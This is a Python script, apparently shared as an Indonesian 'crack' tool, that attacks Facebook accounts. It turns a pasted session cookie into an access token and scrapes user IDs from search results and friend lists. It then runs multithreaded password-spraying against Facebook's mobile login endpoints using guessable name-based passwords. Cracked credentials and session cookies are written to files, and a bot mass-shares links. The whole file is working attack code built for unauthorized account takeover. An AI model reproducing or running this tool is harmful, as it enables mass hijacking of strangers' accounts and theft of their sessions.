'''OPEN SOURCE BY MR QURESHI <3'''

import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
ses=requests.Session()
loop = 0
id,ok,cp, mtd_dev= [],[],[],[]
N = "\x1b[0m"
H = "\x1b[1;92m"
K = "\x1b[1;93m"
ugent = random.choice(["Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/5 7.36","Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]","NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])

def login():
	print("   _______ __                  __        \n  |     __|__|.--------.-----.|  |.-----.\n  |__     |  ||        |  _  ||  ||  -__|\n  |_______|__||__|__|__|   __||__||_____|\n                       |__|              ")
	print(" [*] ---------------------------------------") 
	print(" [+] Author : https://fb.com/fallxavier.xyz") 
	print(" [+] GitHub : https://github.com/Fall-Xavier")
	print(" [*] ---------------------------------------")
	cookie = input(f" [?] masukan cookie : ")
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		open("token.txt", "w").write(find_token.group(1))
		open("cookie.txt", "w").write(cookie)
		print(f"\n token : {find_token.group(1)}")
		time.sleep(3);menu()
	except Exception as e:
		os.system("rm -f data/token.txt data/cookie.txt")
		print(" [!] cookie tidak valid")
		sys.exit()
		
def menu():
	try:
		token = open("token.txt","r").read()
		cok = open("cookie.txt","r").read()
		cookie = {"cookie":cok}
		nama = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}",cookies=cookie).json()["name"]
	except (KeyError,IOError):
		login()
	os.system("clear")
	print("   _______ __                  __        \n  |     __|__|.--------.-----.|  |.-----.\n  |__     |  ||        |  _  ||  ||  -__|\n  |_______|__||__|__|__|   __||__||_____|\n                       |__|              ")
	print(" [*] ---------------------------------------") 
	print(" [+] Author : https://fb.com/fallxavier.xyz") 
	print(" [+] GitHub : https://github.com/Fall-Xavier")
	print(" [*] ---------------------------------------")
	print(f"\n [ selamat datang {K}{nama}{N} ]\n")
	print(" [1]. crack dari pencarian")
	print(" [2]. crack dari id publik")
	print(" [3]. bot share via graph")
	print(" [4]. lihat akun hasil crack")
	ask = input("\n [?] pilih : ")
	if ask in["1"]:
		pencarian()
	elif ask in["2"]:
		publik(token,cookie)
	elif ask in["3"]:
		bot_share(token,cookie)
	elif ask in["4"]:
		print("\n [1] lihat akun hasil crack ok")
		print(" [2] lihat akun hasil crack cp")
		hasil = input("\n [?] pilih : ")
		if hasil in["1"]:
			try:hasilok = open("ok.txt").read().splitlines()
			except:exit(f" [!] tidak ada file ok, silahkan crack dulu")
			print(" [#] ----------------------------------------------")
			print(f" [+] total akun hasil crack ok : {len(hasilok)}")
			print(f" [#] ----------------------------------------------{H}")
			os.system("cat ok.txt")
			exit(f"\n\n {N}[#] selesai cek ...")
		elif hasil in["2"]:
			try:hasilcp = open("ok.txt").read().splitlines()
			except:exit(f" [!] tidak ada file cp, silahkan crack dulu")
			print(" [#] ----------------------------------------------")
			print(f" [+] total akun hasil crack ok : {len(hasilcp)}")
			print(f" [#] ----------------------------------------------{K}")
			os.system("cat cp.txt")
			exit(f"\n\n {N}[#] selesai cek ...")
		else:menu()
	
def convert_id(user):
	payload = {"fburl": "https://free.facebook.com/{user}", "check": "Lookup"}
	if "facebook" in user:
		payload = {"fburl": user, "check": "Lookup"}
	url = parser(ses.post("https://lookup-id.com/", data=payload).content,"html.parser")
	data = url.find("span", id="code")
	idt = data.text
	return idt

def pencarian():
	idt = input(" [?] masukan nama : ").split(",")
	for set3 in idt:
		dump_search(f"https://mbasic.facebook.com/public/{set3}?/locale2=id_ID")
	atursandi()

def dump_search(link):
	try:
		r = parser(ses.get(str(link)).text,'html.parser')
		for x in r.find_all('td'):
			data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
			for uid,name in data:
				if 'profile.php?' in uid:uid = re.findall('id=(.*)',str(uid))[0]
				elif '<span' in name:name = re.findall('(.*?)\<',str(name))[0]
				if uid+"<=>"+name in id:pass
				else:id.append(uid+"<=>"+name)
				sys.stdout.write(f"\r [*] sedang mengumpulkan {len(id)} id....");sys.stdout.flush()
		if 'Lihat Hasil Selanjutnya' in r.text:
			dump_search(r.find('a',string='Lihat Hasil Selanjutnya').get('href'))
	except:
		pass

def publik(token,cookie):
	idt = input(" [?] masukan id atau username : ")
	try:
		for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except:
		exit("privat")
		
def bot_share(token,cookie):
	idt = input(" [?] masukan link : ")
	limit = int(input(" [?] masukan limit : "))
	try:
		n = 0
		header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
		for x in range(limit):
			n+=1
			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={idt}&published=0&access_token={token}",headers=header, cookies=cookie).text
			data = json.loads(post)
			if 'id' in post:
				print(f" {n}. berhasil membagikan {data['id']}")
			else:
				exit(" [!] gagal membagikan, kemungkinan token invalid")
	except:
		exit(" [!] gagal membagikan, kemungkinan token invalid")
		
def atursandi():
	print(f"\n\n [+] total id -> {len(id)}")
	ask = input(" [?] mau gunakan sandi manual atau otomatis?[o/m] : ")
	if ask in["m","M"]:
		manual()
	else:
		otomatis()

def otomatis():
	print("""
 [1]. metode mobile reguler
 [2]. metode mobile validate
""")
	ask = input(" [?] pilih : ")
	if ask in["1"]:
		mtd_dev.append("reguler")
		generateotomatis()
	else:
		mtd_dev.append("validate")
		generateotomatis()
		
def manual():
	pwz = input(" [+] buat kata sandi : ")
	if len(pwz) <= 6:
		print("minimal 6 huruf")
	print("""
 [1]. metode mobile reguler
 [2]. metode mobile validate
""")
	ask = input(" [?] pilih : ")
	if ask in["1"]:
		mtd_dev.append("reguler")
		generatemanual(pwz)
	else:
		mtd_dev.append("validate")
		generatemanual(pwz)
	
def generatemanual(pwz):
	print("\n [+] hasil crack ok tersimpan di -> ok.txt")
	print(" [+] hasil crack cp tersimpan di -> cp.txt\n")
	with ThreadPoolExecutor(max_workers=30) as fall:
		for user in id:
			pwx = []
			uid, zzz = user.split("<=>")[0], user.split("<=>")[1].lower()
			for z in pwz.split(","):
				pwx.append(z)
			if "reguler" in mtd_dev:
				fall.submit(metode_reguler,uid,pwx)
			elif "validate" in mtd_dev:
				fall.submit(metode_validate,uid,pwx)

def generateotomatis():
	print("\n [+] hasil crack ok tersimpan di -> ok.txt")
	print(" [+] hasil crack cp tersimpan di -> cp.txt\n")
	with ThreadPoolExecutor(max_workers=30) as fall:
		for user in id:
			pwx = []
			uid, zzz = user.split("<=>")[0], user.split("<=>")[1].lower()
			xxz = zzz.split(" ")[0]
			pwx = ["sayang"]
			if len(zzz)<6:
				if len(xxz)<3:
					pass
				else:
					pwx.append(xxz+"123")
					pwx.append(xxz+"12345")
			else:
				if len(xxz)<3:
					pwx.append(zzz)
				else:
					pwx.append(zzz)
					pwx.append(xxz+"123")
					pwx.append(xxz+"12345")
			if "reguler" in mtd_dev:
				fall.submit(metode_reguler,uid,pwx)
			elif "validate" in mtd_dev:
				fall.submit(metode_validate,uid,pwx)
				
def metode_reguler(user,pwx):
	global loop, ok, cp
	sys.stdout.write(f"\r [*] [crack] {loop}/{len(id)}  ok : {len(ok)} - cp : {len(cp)}        "),
	sys.stdout.flush()
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			url = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8")
			headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer'": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"email":user,"pass": pw}
			post = ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data=data, headers=headers)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = ";".join(i["name"]+"="+i["value"] for i in ses.cookies.get_dict())
				print(f"\r  {H}* --> {user}|{pw}|{coki}")
				open("ok.txt","a").write(f"  * --> {user}|{pw}|{coki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp.append(user)
				print(f"\r  {K}* --> {user}|{pw}         ")
				open("cp.txt","a").write(f"  * --> {user}|{pw}\n")
				break
			else:
				continue
		loop +=1
	except Exception as e:
		time.sleep(32)

def metode_validate(user,pwx):
	global loop, ok, cp
	sys.stdout.write(f"\r [*] [crack] {loop}/{len(id)}  ok : {len(ok)} - cp : {len(cp)}        "),
	sys.stdout.flush()
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			url = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin")
			headers = {"Host": "m.facebook.com","connection":"keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Pragma":"akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace","x-requested-with": "mark.via.gp","dnt": "1","sec-ch-ua":"' Not A;Brand';v='99', 'Chromium';v='99'","sec-ch-ua-mobile":"?1","sec-ch-ua-platform":"'Android'","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-user": "?1","sec-fetch-dest": "document","Upgrade-Insecure-Requests":"1","User-Agent":ugent,"referer": "https://m.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin","accept-encoding": "gzip, deflate","accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"}
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"uid":user,"flow":"login_no_pin","pass": pw,"next": "https://m.facebook.com/login/save-device/"}
			post = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=data, headers=headers, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = ";".join(i["name"]+"="+i["value"] for i in ses.cookies.get_dict())
				print(f"\r  {H}* --> {user}|{pw}|{coki}")
				open("ok.txt","a").write(f"  * --> {user}|{pw}|{coki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp.append(user)
				print(f"\r  {K}* --> {user}|{pw}         ")
				open("cp.txt","a").write(f"  * --> {user}|{pw}\n")
				break
			else:
				continue
		loop +=1
	except Exception as e:
		time.sleep(32)

if __name__=='__main__':
	menu()
